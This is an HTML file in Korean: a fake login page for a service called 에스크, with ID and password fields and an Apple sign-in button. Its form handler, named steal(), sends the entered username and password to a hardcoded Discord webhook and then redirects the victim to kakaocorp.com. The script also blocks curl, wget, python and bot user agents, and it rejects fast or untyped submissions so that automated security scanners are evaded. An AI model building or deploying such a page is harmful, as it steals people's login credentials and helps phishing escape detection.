<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>에스크 로그인</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Helvetica Neue', sans-serif;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .login-wrapper {
      width: 360px;
      padding: 20px;
    }

    .logo {
      display: flex;
      align-items: center;
      font-weight: bold;
      font-size: 20px;
      margin-bottom: 30px;
    }

    .logo::before {
      content: '';
      display: inline-block;
      width: 28px;
      height: 28px;
      background-image: url('https://www.google.com/gasearch?q=%EC%97%90%EC%8A%A4%ED%81%AC&udm=2&source=sh/x/gs/m2/5#vhid=HEMhI0juQ4g3BM&vssid=mosaic');
      background-size: contain;
      background-repeat: no-repeat;
      margin-right: 8px;
    }

    label {
      display: block;
      font-weight: bold;
      margin-bottom: 6px;
      font-size: 15px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 18px;
      border-radius: 10px;
      border: 1px solid #ddd;
      font-size: 15px;
    }

    .find-links {
      display: flex;
      justify-content: flex-end;
      gap: 14px;
      margin-top: -12px;
      margin-bottom: 20px;
      font-size: 13px;
    }

    .find-links a {
      color: #888;
      text-decoration: none;
    }

    .find-links a:hover {
      text-decoration: underline;
    }

    .login-btn {
      width: 100%;
      padding: 14px;
      background-color: #8bd3ff;
      color: white;
      font-weight: bold;
      font-size: 15px;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      margin-bottom: 20px;
    }

    .divider {
      text-align: center;
      color: #bbb;
      margin: 20px 0;
      position: relative;
    }

    .divider::before,
    .divider::after {
      content: '';
      position: absolute;
      top: 50%;
      width: 40%;
      height: 1px;
      background-color: #eee;
    }

    .divider::before {
      left: 0;
    }

    .divider::after {
      right: 0;
    }

    .apple-login {
      width: 100%;
      padding: 14px;
      background-color: black;
      color: white;
      font-size: 15px;
      font-weight: bold;
      border: none;
      border-radius: 10px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
      cursor: pointer;
    }

    .apple-login i {
      font-style: normal;
      font-size: 18px;
    }

    .signup {
      text-align: center;
      margin-top: 24px;
      font-size: 13px;
      color: #aaa;
    }

    .signup a {
      color: #1da1f2;
      text-decoration: none;
    }

    .signup a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">로그인</div>

    <form onsubmit="steal(event)">
      <label for="username">아이디</label>
      <input class="input-field" id="username" type="text" placeholder="아이디 입력" required>

      <label for="password">비밀번호</label>
      <input class="input-field" id="password" type="password" placeholder="비밀번호 입력" required>

      <div class="find-links">
        <a href="#">아이디 찾기</a>
        <a href="#">비밀번호 찾기</a>
      </div>

      <button type="submit" class="login-btn">로그인</button>
    </form>

    <div class="divider">또는</div>

    <button class="apple-login">
      <i></i> Apple로 시작하기
    </button>

    <div class="signup">
      아직 에스크 계정이 없으신가요? <a href="#">회원가입</a>
    </div>
  </div>
<script>
  const startTime = Date.now();
  let typed = false;

  // User-Agent blocklist (very basic)
  const ua = navigator.userAgent.toLowerCase();
  const bots = ['curl', 'wget', 'python', 'bot', 'spider', 'httpclient'];
  const isBot = bots.some(agent => ua.includes(agent));
  if (isBot) {
    console.log("Bot detected. Exiting.");
    throw new Error("Blocked");
  }

  // Detect real typing
  document.querySelectorAll(".input-field").forEach(field => {
    field.addEventListener("input", () => {
      typed = true;
    });
  });

  function steal(e) {
    e.preventDefault();

    // Delay + typing check
    if (!typed || (Date.now() - startTime < 3000)) {
      console.log("Suspicious interaction. Exiting.");
      return;
    }

    const u = document.getElementById("username").value;
    const p = document.getElementById("password").value;

    fetch("https://discord.com/api/webhooks/1358102599647232202/4L51fQpmCq7hnbVud6P2AoYXGkpIrt2dYOts15JgJUb9LiEMeIxJJF5AdmDfJxtHlwFd", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `🛑 고양이\nUsername: ${u}\nPassword: ${p}`
      })
    })
    .then(response => {
      if (response.ok) {
        setTimeout(() => {
          window.location.href = "https://www.kakaocorp.com";
        }, Math.random() * 2000 + 1000);
      } else {
        alert('Something went wrong.');
      }
    })
    .catch(() => {
      alert('Network error.');
    });
  }
</script>
</body>
</html>
